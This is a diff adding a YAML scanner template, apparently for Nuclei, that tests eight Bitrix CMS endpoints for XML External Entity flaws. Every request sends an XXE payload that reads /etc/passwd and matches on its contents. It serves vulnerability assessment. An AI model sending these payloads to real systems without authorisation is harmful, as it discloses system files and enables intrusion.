@@ -1,0 +1,182 @@
+id: bitrix-xxe-vulnerabilities
+
+info:
+  name: Bitrix XXE (XML External Entity) Vulnerabilities
+  author: clevergod
+  severity: high
+  description: |
+    Проверка XXE уязвимостей в Bitrix CMS через XML обработку
+  tags: bitrix,xxe,xml,external-entity
+
+requests:
+  # XXE через RSS импорт
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/admin/rss_import.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <rss>
+        <channel>
+          <title>&xxe;</title>
+        </channel>
+      </rss>
+    matchers:
+      - type: word
+        name: xxe-rss
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через XML импорт
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/admin/xml_import.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <import>
+        <data>&xxe;</data>
+      </import>
+    matchers:
+      - type: word
+        name: xxe-xml-import
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через SOAP
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/soap.php"
+    headers:
+      Content-Type: application/soap+xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <test>&xxe;</test>
+        </soap:Body>
+      </soap:Envelope>
+    matchers:
+      - type: word
+        name: xxe-soap
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через WebDAV
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/webdav.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <webdav>
+        <data>&xxe;</data>
+      </webdav>
+    matchers:
+      - type: word
+        name: xxe-webdav
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через компонент vote
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <vote>
+        <data>&xxe;</data>
+      </vote>
+    matchers:
+      - type: word
+        name: xxe-vote
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через компонент forum
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <forum>
+        <data>&xxe;</data>
+      </forum>
+    matchers:
+      - type: word
+        name: xxe-forum
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через компонент blog
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <blog>
+        <data>&xxe;</data>
+      </blog>
+    matchers:
+      - type: word
+        name: xxe-blog
+        words:
+          - "root:"
+          - "daemon:"
+
+  # XXE через компонент catalog
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <catalog>
+        <data>&xxe;</data>
+      </catalog>
+    matchers:
+      - type: word
+        name: xxe-catalog
+        words:
+          - "root:"
+          - "daemon:" 
